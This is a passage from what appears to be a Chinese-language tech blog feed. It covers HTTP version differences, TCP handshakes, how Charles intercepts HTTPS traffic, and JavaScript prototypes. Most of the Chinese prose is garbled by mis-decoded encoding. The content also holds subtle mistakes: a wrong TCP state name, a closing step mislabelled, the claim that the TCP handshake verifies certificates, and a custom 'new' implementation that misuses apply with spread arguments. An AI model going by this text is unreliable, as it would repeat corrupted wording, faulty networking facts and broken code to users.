‡å‡†ã€‚HTTP1.1åˆ™å¼•å…¥äº†æ›´å¤šç¼“å­˜æ§åˆ¶ç­–ç•¥ï¼Œå¦‚Entity tagï¼ŒIf-Unmodified-Since, If-Match, If-None-Matchã€‚</li><li>Range<br>å…è®¸åªè¯·æ±‚èµ„æºçš„æŸä¸ªéƒ¨åˆ†ï¼Œæ”¯æŒæ–­ç‚¹ç»­ä¼ åŠŸèƒ½</li><li>Host<br>åœ¨HTTP1.0ä¸­è®¤ä¸ºæ¯å°æœåŠ¡å™¨éƒ½ç»‘å®šä¸€ä¸ªå”¯ä¸€çš„IPåœ°å€ã€‚ä½†éšç€è™šæ‹Ÿä¸»æœºæŠ€æœ¯çš„å‘å±•ï¼Œåœ¨ä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šå¯ä»¥å­˜åœ¨å¤šä¸ªè™šæ‹Ÿä¸»æœºï¼ˆMulti-homed Web Serversï¼‰ï¼Œå¹¶ä¸”å®ƒä»¬å…±äº«ä¸€ä¸ªIPåœ°å€ã€‚HTTP1.1çš„è¯·æ±‚æ¶ˆæ¯å’Œå“åº”æ¶ˆæ¯éƒ½åº”æ”¯æŒHostå¤´åŸŸã€‚</li><li>é•¿è¿æ¥<br>HTTP 1.1æ”¯æŒé•¿è¿æ¥ï¼ˆPersistentConnectionï¼‰å’Œè¯·æ±‚çš„æµæ°´çº¿ï¼ˆPipeliningï¼‰å¤„ç†ï¼Œåœ¨ä¸€ä¸ªTCPè¿æ¥ä¸Šå¯ä»¥ä¼ é€å¤šä¸ªHTTPè¯·æ±‚å’Œå“åº”ï¼Œå‡å°‘äº†å»ºç«‹å’Œå…³é—­è¿æ¥çš„æ¶ˆè€—å’Œå»¶è¿Ÿï¼Œåœ¨HTTP1.1ä¸­é»˜è®¤å¼€å¯Connectionï¼š keep-alive</li><li>æ–°å¢24ä¸ªé”™è¯¯çŠ¶æ€å“åº”ç </li></ul><p><br><br><strong>HTTP1.0å’Œ1.1å­˜åœ¨çš„é—®é¢˜</strong></p><ul><li>æ˜æ–‡ä¼ è¾“</li><li>è¯·æ±‚å¤´å†…å®¹è¿‡å¤§ï¼Œæ¯æ¬¡è¯·æ±‚headeråŸºæœ¬ä¸æ€ä¹ˆå˜åŒ–ï¼Œå¢åŠ äº†ä¼ è¾“æˆæœ¬</li><li>è™½ç„¶HTTP1.xæ”¯æŒäº†keep-aliveï¼Œæ¥å¼¥è¡¥å¤šæ¬¡åˆ›å»ºè¿æ¥äº§ç”Ÿçš„å»¶è¿Ÿï¼Œä½†æ˜¯keep-aliveä½¿ç”¨å¤šäº†åŒæ ·ä¼šç»™æœåŠ¡ç«¯å¸¦æ¥å¤§é‡çš„æ€§èƒ½å‹åŠ›ï¼Œå¹¶ä¸”å¯¹äºå•ä¸ªæ–‡ä»¶è¢«ä¸æ–­è¯·æ±‚çš„æœåŠ¡(ä¾‹å¦‚å›¾ç‰‡å­˜æ”¾ç½‘ç«™)ï¼Œkeep-aliveå¯èƒ½ä¼šæå¤§çš„å½±å“æ€§èƒ½ï¼Œå› ä¸ºå®ƒåœ¨æ–‡ä»¶è¢«è¯·æ±‚ä¹‹åè¿˜ä¿æŒäº†ä¸å¿…è¦çš„è¿æ¥å¾ˆé•¿æ—¶é—´</li></ul><p><br><br><strong>HTTP2.0æ–°ç‰¹æ€§</strong></p><ul><li>äºŒè¿›åˆ¶æ ¼å¼<br>HTTP1.Xçš„è§£ææ˜¯åŸºäºæ–‡æœ¬ï¼ŒäºŒè¿›åˆ¶åˆ™åªè®¤0å’Œ1çš„ç»„åˆï¼Œæ–¹ä¾¿ä¸”å¥å£®ã€‚</li><li>å¤šè·¯å¤ç”¨<br>è¿æ¥å…±äº«ã€‚ä¸€ä¸ªrequestå¯¹åº”ä¸€ä¸ªidï¼Œè¿™æ ·ä¸€ä¸ªè¿æ¥ä¸Šå¯ä»¥æœ‰å¤šä¸ªrequestï¼Œrequestå¯ä»¥éšæœºçš„æ··æ‚åœ¨ä¸€èµ·ï¼Œæ¥æ”¶æ–¹å¯ä»¥æ ¹æ®requestçš„idå°†requestå†å½’å±åˆ°å„è‡ªä¸åŒçš„æœåŠ¡ç«¯è¯·æ±‚é‡Œã€‚æŸä¸ªè¯·æ±‚è€—æ—¶ä¸¥é‡ï¼Œä¸ä¼šå½±å“å…¶ä»–è¯·æ±‚çš„æ­£å¸¸æ‰§è¡Œã€‚</li><li>headerå‹ç¼©<br>é€šè®¯åŒæ–¹å„è‡ªcacheä¸€ä»½header fieldsè¡¨ï¼Œé¿å…äº†é‡å¤headerçš„ä¼ è¾“ï¼Œåˆå‡å°‘äº†ä¼ è¾“çš„å¤§å°</li><li>æœåŠ¡ç«¯æ¨é€<br>æœåŠ¡ç«¯æ¨é€èƒ½æŠŠå®¢æˆ·ç«¯æ‰€éœ€è¦çš„èµ„æºä¼´éšç€index.htmlä¸€èµ·å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œçœå»äº†å®¢æˆ·ç«¯é‡å¤è¯·æ±‚çš„æ­¥éª¤ã€‚æ­£å› ä¸ºæ²¡æœ‰å‘èµ·è¯·æ±‚ï¼Œå»ºç«‹è¿æ¥ç­‰æ“ä½œï¼Œæ‰€ä»¥é™æ€èµ„æºé€šè¿‡æœåŠ¡ç«¯æ¨é€çš„æ–¹å¼å¯ä»¥æå¤§åœ°æå‡é€Ÿåº¦ã€‚</li></ul><p><br></p><h4 id="6-8-å¤§æ–‡ä»¶åˆ†ç‰‡ä¸Šä¼ "><a href="#6-8-å¤§æ–‡ä»¶åˆ†ç‰‡ä¸Šä¼ " class="headerlink" title="6.8 å¤§æ–‡ä»¶åˆ†ç‰‡ä¸Šä¼ "></a><em>6.8 å¤§æ–‡ä»¶åˆ†ç‰‡ä¸Šä¼ </em></h4><p><br></p><p><br></p><h4 id="6-9-æ— ç—•æ¨¡å¼"><a href="#6-9-æ— ç—•æ¨¡å¼" class="headerlink" title="6.9 æ— ç—•æ¨¡å¼"></a><em>6.9 æ— ç—•æ¨¡å¼</em></h4><p>ä»åŠŸèƒ½ä¸Šæ˜ç¡®æ— ç—•æµè§ˆçš„ä½œç”¨ï¼Œæ¶‰åŠçš„åŠŸèƒ½åŒ…æ‹¬ï¼šBookmark, History(input, browser, download, forms/auto complete), SSL certs, Cookie, local storage, webSQL, Application cache, HTTP Cache, Disk Cache, Web App/Pluginã€‚</p><ul><li><p>ä»æ­£å¸¸æ¨¡å¼è¿›å…¥æ— ç—•æ¨¡å¼<br>è¿›å…¥æ— ç—•æ¨¡å¼å‰çš„ä¿¡æ¯æ˜¯å¦ä¼šåœ¨æ— ç—•ä¸‹ä½¿ç”¨<br><img src="/2019/08/16/HTTP/1.jpeg" style="margin: 30px auto"></p></li><li><p>å†æ¬¡è¿›å…¥æ— ç—•æ¨¡å¼<br>åœ¨å‰ä¸€æ— ç—•æ¨¡å¼ä¸‹è®¾ç½®çš„é¡¹ç›®ï¼Œæ˜¯å¦å¯ä»¥åœ¨ä¸‹ä¸€æ¬¡æ— ç—•æ¨¡å¼ä¸‹ä½¿ç”¨<br><img src="/2019/08/16/HTTP/2.jpeg" style="margin: 30px auto"></p></li></ul><p><br></p><h4 id="6-10-å¤šè·¯å¤ç”¨-vs-é•¿è¿æ¥"><a href="#6-10-å¤šè·¯å¤ç”¨-vs-é•¿è¿æ¥" class="headerlink" title="6.10. å¤šè·¯å¤ç”¨ vs é•¿è¿æ¥"></a><em>6.10. å¤šè·¯å¤ç”¨ vs é•¿è¿æ¥</em></h4><p>HTTP2.0å¤šè·¯å¤ç”¨å’ŒHTTP1.Xä¸­çš„é•¿è¿æ¥å¤ç”¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><ul><li>HTTP/1.*<br>ä¸€æ¬¡è¯·æ±‚-ç›¸åº”ï¼Œå»ºç«‹ä¸€ä¸ªè¿æ¥ï¼Œç”¨å®Œå…³é—­ï¼›æ¯ä¸€ä¸ªè¯·æ±‚éƒ½è¦å»ºç«‹ä¸€ä¸ªè¿æ¥</li><li>HTTP/1.1 Pipeling<br>è‹¥å¹²ä¸ªè¯·æ±‚æ’é˜Ÿä¸²è¡ŒåŒ–å•çº¿ç¨‹å¤„ç†ï¼Œåé¢çš„è¯·æ±‚ç­‰å¾…å‰é¢è¯·æ±‚çš„è¿”å›æ‰èƒ½è·å¾—æ‰§è¡Œæœºä¼šï¼Œä¸€æ—¦æœ‰æŸè¯·æ±‚è¶…æ—¶ç­‰ï¼Œåç»­è¯·æ±‚åªèƒ½è¢«é˜»å¡ã€‚</li><li>HTTP/2<br>å¤šä¸ªè¯·æ±‚å¯åŒæ—¶åœ¨ä¸€ä¸ªè¿æ¥ä¸Šå¹¶è¡Œæ‰§è¡Œã€‚æŸä¸ªè¯·æ±‚ä»»åŠ¡è€—æ—¶ä¸¥é‡ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–è¿æ¥çš„æ­£å¸¸æ‰§è¡Œã€‚<br><img src="/2019/08/16/HTTP/3.png" style="max-width:500px; margin: 30px auto"></li></ul><p><br></p><h4 id="6-11-ä¸‰æ¬¡æ¡æ‰‹-amp-å››æ¬¡æŒ¥æ‰‹"><a href="#6-11-ä¸‰æ¬¡æ¡æ‰‹-amp-å››æ¬¡æŒ¥æ‰‹" class="headerlink" title="6.11. ä¸‰æ¬¡æ¡æ‰‹ &amp; å››æ¬¡æŒ¥æ‰‹"></a><em>6.11. ä¸‰æ¬¡æ¡æ‰‹ &amp; å››æ¬¡æŒ¥æ‰‹</em></h4><p><strong>ä¸‰æ¬¡æ¡æ‰‹</strong></p><ul><li>ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ª SYN æŠ¥æ–‡ã€‚å®¢æˆ·ç«¯å¤„äº SYN_send çŠ¶æ€ã€‚</li><li>ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ° SYN æŠ¥æ–‡ä¹‹åï¼Œä¼šåº”ç­”ä¸€ä¸ª SYN+ACK æŠ¥æ–‡ã€‚æœåŠ¡å™¨å¤„äº SVN_REVD çŠ¶æ€ã€‚</li><li>ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° SYN+ACK æŠ¥æ–‡ä¹‹åï¼Œä¼šå›åº”ä¸€ä¸ª ACK æŠ¥æ–‡ã€‚å®¢æˆ·ç«¯å¤„äº establised çŠ¶æ€ã€‚</li><li>æœåŠ¡å™¨æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åï¼Œä¸‰æ¬¡æ¡æ‰‹å»ºç«‹å®Œæˆã€‚æœåŠ¡å™¨å¤„äº establised çŠ¶æ€ã€‚</li></ul><p><br><br><strong>ä¸‰æ¬¡æ¡æ‰‹çš„ä½œç”¨</strong></p><ul><li>ä¸ºäº†ç¡®è®¤åŒæ–¹çš„æ¥æ”¶å’Œå‘é€èƒ½åŠ›æ˜¯å¦æ­£å¸¸ã€‚</li><li>æŒ‡å®šè‡ªå·±çš„åˆå§‹åŒ–åºåˆ—å·ï¼Œä¸ºåé¢çš„å¯é ä¼ é€åšå‡†å¤‡ã€‚</li><li>å¦‚æœæ˜¯ https åè®®çš„è¯ï¼Œä¸‰æ¬¡æ¡æ‰‹è¿™ä¸ªè¿‡ç¨‹ï¼Œè¿˜ä¼šè¿›è¡Œæ•°å­—è¯ä¹¦çš„éªŒè¯ä»¥åŠåŠ å¯†å¯†é’¥çš„ç”Ÿæˆã€‚<br><img src="/2019/08/16/HTTP/4.png" style="max-width: 500px; margin: 30px auto"></li></ul><p><br><br><strong>å››æ¬¡æŒ¥æ‰‹</strong></p><ul><li>ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ä¸€ä¸ª FIN æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­ä¼šæŒ‡å®šä¸€ä¸ªåºåˆ—å·ã€‚æ­¤æ—¶å®¢æˆ·ç«¯å¤„äºFIN_WAIT1çŠ¶æ€ã€‚</li><li>ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡ç«¯æ”¶åˆ° FIN ä¹‹åï¼Œä¼šå‘é€ ACK æŠ¥æ–‡ï¼Œä¸”æŠŠå®¢æˆ·ç«¯çš„åºåˆ—å·å€¼ + 1 ä½œä¸º ACK æŠ¥æ–‡çš„åºåˆ—å·å€¼ï¼Œè¡¨æ˜å·²ç»æ”¶åˆ°å®¢æˆ·ç«¯çš„æŠ¥æ–‡äº†ï¼Œæ­¤æ—¶æœåŠ¡ç«¯å¤„äº CLOSE_WAITçŠ¶æ€ã€‚</li><li>ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šå¦‚æœæœåŠ¡ç«¯ä¹Ÿæƒ³æ–­å¼€è¿æ¥äº†ï¼Œå’Œå®¢æˆ·ç«¯çš„ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ä¸€æ ·ï¼Œå‘ç»™ FIN æŠ¥æ–‡ï¼Œä¸”æŒ‡å®šä¸€ä¸ªåºåˆ—å·ã€‚æ­¤æ—¶æœåŠ¡ç«¯å¤„äº LAST_ACK çš„çŠ¶æ€ã€‚</li><li>ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° FIN ä¹‹åï¼Œä¸€æ ·å‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ä½œä¸ºåº”ç­”ï¼Œä¸”æŠŠæœåŠ¡ç«¯çš„åºåˆ—å·å€¼ + 1 ä½œä¸ºè‡ªå·± ACK æŠ¥æ–‡çš„åºåˆ—å·å€¼ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¤„äº TIME_WAIT çŠ¶æ€ã€‚éœ€è¦è¿‡ä¸€é˜µå­ä»¥ç¡®ä¿æœåŠ¡ç«¯æ”¶åˆ°è‡ªå·±çš„ ACK æŠ¥æ–‡ä¹‹åæ‰ä¼šè¿›å…¥ CLOSED çŠ¶æ€</li><li>æœåŠ¡ç«¯æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åï¼Œå°±å¤„äºå…³é—­è¿æ¥äº†ï¼Œå¤„äº CLOSED çŠ¶æ€ã€‚</li></ul><p><img src="/2019/08/16/HTTP/5.png" style="max-width: 500px; margin: 30px auto"></p><p><br></p><h4 id="6-12-httpsæŠ“åŒ…åŸç†"><a href="#6-12-httpsæŠ“åŒ…åŸç†" class="headerlink" title="6.12 httpsæŠ“åŒ…åŸç†"></a><em>6.12 httpsæŠ“åŒ…åŸç†</em></h4><p>ä¸ºä»€ä¹ˆç”¨äº†httpsè¿˜èƒ½è¢«æŠ“åŒ…ï¼Ÿ<br>Charlesä½œä¸ºä¸€ä¸ªä¸­é—´äººä»£ç†ï¼Œå½“æµè§ˆå™¨å’ŒæœåŠ¡å™¨é€šä¿¡æ—¶ï¼ŒCharlesæ¥æ”¶æœåŠ¡å™¨çš„è¯ä¹¦ï¼Œä½†æ˜¯ä¸ä¼šå‘ç»™æµè§ˆå™¨ï¼Œè€Œæ˜¯åŠ¨æ€ç”Ÿæˆä¸€å¼ è¯ä¹¦å‘é€ç»™æµè§ˆå™¨ã€‚ç”±äºCharlesæ›´æ”¹äº†è¯ä¹¦ï¼Œæµè§ˆå™¨æ ¡éªŒä¸åŒè¿‡ä¼šå¼¹å‡ºå®‰å…¨è­¦å‘Šï¼Œæ‰€ä»¥å¿…é¡»å®‰è£…Charlesçš„è¯ä¹¦åæ‰èƒ½æ­£å¸¸è®¿é—®ã€‚</p><p>Charleséœ€è¦åšçš„äº‹æƒ…æ˜¯å¯¹å®¢æˆ·ç«¯ä¼ªè£…æœåŠ¡ç«¯ï¼Œå¯¹æœåŠ¡ç«¯ä¼ªè£…å®¢æˆ·ç«¯ï¼š</p><ul><li>æˆªè·çœŸå®å®¢æˆ·ç«¯çš„httpsè¯·æ±‚ï¼Œä¼ªè£…å®¢æˆ·ç«¯å‘çœŸå®æœåŠ¡ç«¯å‘é€httpsè¯·æ±‚ã€‚</li><li>æ¥å—çœŸå®æœåŠ¡å™¨å“åº”ï¼Œç”¨charlesè‡ªå·±çš„è¯ä¹¦ä¼ªè£…æœåŠ¡ç«¯å‘çœŸå®å®¢æˆ·ç«¯å‘é€æ•°æ®å†…å®¹ã€‚</li></ul><h4 id="6-13-URLé•¿åº¦é™åˆ¶"><a href="#6-13-URLé•¿åº¦é™åˆ¶" class="headerlink" title="6.13 URLé•¿åº¦é™åˆ¶"></a>6.13 URLé•¿åº¦é™åˆ¶</h4><p>2083å­—èŠ‚(2kb + 53)</p><h4 id="6-14-ç«¯å£ä¸Šé™"><a href="#6-14-ç«¯å£ä¸Šé™" class="headerlink" title="6.14 ç«¯å£ä¸Šé™"></a>6.14 ç«¯å£ä¸Šé™</h4><p>65535(2^16-1)</p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li>ã€Šå›¾è§£HTTPã€‹</li><li><a href="https://juejin.im/post/5cf765275188257c6b51775f" target="_blank" rel="noopener">å‰ç«¯å¤§æ–‡ä»¶ä¸Šä¼ </a></li><li><a href="http://www.nbsite.cn/database/176" target="_blank" rel="noopener">shadowsockåŸç†è¯¦è§£</a></li><li><a href="https://blog.csdn.net/horkychen/article/details/21054807" target="_blank" rel="noopener">Chromeçš„æ— ç—•æµè§ˆå®ç°åˆæ¢</a></li><li><a href="https://juejin.im/entry/5981c5df518825359a2b9476" target="_blank" rel="noopener">HTTP1.0ã€HTTP1.1 å’Œ HTTP2.0 çš„åŒºåˆ«</a></li><li><a href="https://juejin.im/post/5ccd0dfc6fb9a0324a08bb73" target="_blank" rel="noopener">å…³äºä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹é¢è¯•å®˜æƒ³è€ƒæˆ‘ä»¬ä»€ä¹ˆï¼Ÿ</a></li><li><a href="https://juejin.im/post/5d0c703351882532bd607cab" target="_blank" rel="noopener">Http,Socket,Tcp,Udp,IpåŸç†åŒºåˆ«</a></li><li><a href="https://juejin.im/entry/58077fab0e3dd900572bc35b" target="_blank" rel="noopener">HTTPS åŸç†å‰–æä¸é¡¹ç›®åœºæ™¯</a></li><li><a href="https://m.php.cn/faq/428990.html" target="_blank" rel="noopener">httpsæŠ“åŒ…åŸç†</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS åŸå‹é“¾ï¼ˆç»§æ‰¿ï¼‰, thisï¼Œnew</title>
      <link href="/2019/08/07/JS%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
      <url>/2019/08/07/JS%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
      <content type="html"><![CDATA[<h3 id="1-åŸå‹é“¾ï¼ˆç»§æ‰¿ï¼‰"><a href="#1-åŸå‹é“¾ï¼ˆç»§æ‰¿ï¼‰" class="headerlink" title="1. åŸå‹é“¾ï¼ˆç»§æ‰¿ï¼‰"></a>1. åŸå‹é“¾ï¼ˆç»§æ‰¿ï¼‰</h3><p>åŸå‹é“¾ï¼ŒJavaScript å¯¹è±¡æœ‰ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªåŸå‹å¯¹è±¡çš„é“¾ã€‚å½“è¯•å›¾è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå®ƒä¸ä»…ä»…åœ¨è¯¥å¯¹è±¡ä¸Šæœå¯»ï¼Œè¿˜ä¼šæœå¯»è¯¥å¯¹è±¡çš„åŸå‹ï¼Œä»¥åŠè¯¥å¯¹è±¡çš„åŸå‹çš„åŸå‹ï¼Œä¾æ¬¡å±‚å±‚å‘ä¸Šæœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåå­—åŒ¹é…çš„å±æ€§æˆ–åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// f.prototypeç”¨äºæŒ‡å‘å¯¹è±¡fçš„åŸå‹</span></span><br><span class="line"><span class="comment">// åœ¨få‡½æ•°çš„åŸå‹ä¸Šå®šä¹‰å±æ€§</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line"><span class="comment">// oçš„æ•´ä¸ªåŸå‹é“¾å¦‚ä¸‹:</span></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype---&gt; null</span></span><br></pre></td></tr></table></figure><p>æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª prototype å±æ€§ï¼Œè¿™ä¸ªå±æ€§æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªå¯¹è±¡ã€‚åŸå‹å¯¹è±¡çš„å¥½å¤„æ˜¯ï¼Œå¯ä»¥è®©æ¯ä¸ªå®ä¾‹éƒ½æœ‰è‡ªå·±çš„ä¸€ä»½å®ä¾‹å±æ€§çš„å‰¯æœ¬ï¼Œä½†åŒæ—¶åˆå…±äº«ç€å¯¹æ–¹æ³•çš„å¼•ç”¨ï¼Œæœ€å¤§é™åº¦åœ°èŠ‚çœäº†å†…å­˜ã€‚</p><p><br></p><h4 id="1-1-prototype-ä¸-proto"><a href="#1-1-prototype-ä¸-proto" class="headerlink" title="1.1 prototype ä¸ __proto"></a>1.1 <code>prototype</code> ä¸ <code>__proto</code></h4><p><code>__proto</code> æ˜¯å®ä¾‹çš„åŸå‹å¯¹è±¡ã€‚<br><code>prototype</code>ç”¨äºå®šä¹‰åŸå‹å¯¹è±¡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>ä¸€ä¸ªå¯¹è±¡ A çš„<code>__proto__</code>æŒ‡å‘å¯¹è±¡ B,é‚£ä¹ˆ B å°±æ˜¯ A çš„åŸå‹å¯¹è±¡ã€‚<br>A å¯ä»¥ç”¨ B ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨ B çš„åŸå‹ä¸Šçš„å±æ€§å’Œæ–¹æ³•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Parent.prototype.sayName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> Parent(<span class="string">'xl'</span>,<span class="number">20</span>)</span><br><span class="line"><span class="built_in">console</span>.log(Parent.prototype); <span class="comment">// Parent &#123; sayName: Function &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.__proto__); <span class="comment">// Parent &#123; sayName: Function &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.prototype); <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(Parent.__proto__); <span class="comment">// [Function], Parentæ˜¯Functionçš„å®ä¾‹</span></span><br><span class="line">p.sayName() <span class="comment">// 'xl'</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-new-Function-åšäº†ä»€ä¹ˆï¼Ÿ"><a href="#1-2-new-Function-åšäº†ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1.2 new Function åšäº†ä»€ä¹ˆï¼Ÿ"></a>1.2 new Function åšäº†ä»€ä¹ˆï¼Ÿ</h4><p>Function å¯ä»¥æ˜¯ Object çš„æ„é€ å‡½æ•°ï¼Œnew ä¸€ä¸ª Function æ—¶ï¼Œä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚</p><ul><li><code>const a = new Person(&#39;Tom&#39;)</code></li><li>æ–°å»ºä¸€ä¸ªæ–°çš„ç©ºå¯¹è±¡<code>const a = {}</code></li><li>è®¾ç½®<code>a.__proto__ = Person. prototype</code></li><li>æ‰§è¡ŒPersonæ„é€ å‡½æ•°ï¼Œå¦‚<code>a.name = &#39;Tom&#39;</code></li><li>æ„é€ å‡½æ•°Personæ²¡æœ‰returnè¯­å¥ï¼Œåˆ™å°†è¯¥æ–°åˆ›å»ºçš„å¯¹è±¡è¿”å›</li></ul><p><img src="/2019/08/07/JSåŸå‹é“¾/1.jpg" style="width:500px"></p><p><br></p><h4 id="1-3-å®ç°ä¸€ä¸ª-new"><a href="#1-3-å®ç°ä¸€ä¸ª-new" class="headerlink" title="1.3 å®ç°ä¸€ä¸ª new"></a>1.3 å®ç°ä¸€ä¸ª new</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myNew</span> (<span class="params">func, ...args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> obj = <span class="built_in">Object</span>.create(func.prototype)</span><br><span class="line">  <span class="keyword">let</span> result = func.apply(obj, ...args)</span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">instanceof</span> <span class="built_in">Object</span> ? result : obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = myNew(Person, <span class="string">"huihui"</span>, <span class="number">123</span>)</span><br><span class="line"><span class="built_in">console</span>.log(p) <span class="comment">// Person &#123;name: "huihui", age: 123&#125;</span></span><br><span class="line">p.sayName() <span class="comment">// huihui</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-ç±»ç»§æ‰¿-extends"><a href="#2-ç±»ç»§æ‰¿-extends" class="headerlink" title="2. ç±»ç»§æ‰¿ extends"></a>2. ç±»ç»§æ‰¿ extends</h3><p>å­ç±»å¯ä»¥é‡å†™çˆ¶ç±»çš„æ–¹æ³•ï¼Œåªéœ€åœ¨å­ç±»ä¸­å®šä¹‰ä¸€ä¸ªä¸çˆ¶ç±»æ–¹æ³•åŒåçš„æ–¹æ³•å³å¯ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    sayHello() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Hello from parent class.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    sayHello() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Hello from child class.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="keyword">new</span> Child();</span><br><span class="line">child.sayHello(); <span class="comment">// è¾“å‡º: Hello from child class.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] <span class="comment">// ç»§æ‰¿å†…ç½®ç±» Array String</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> str = 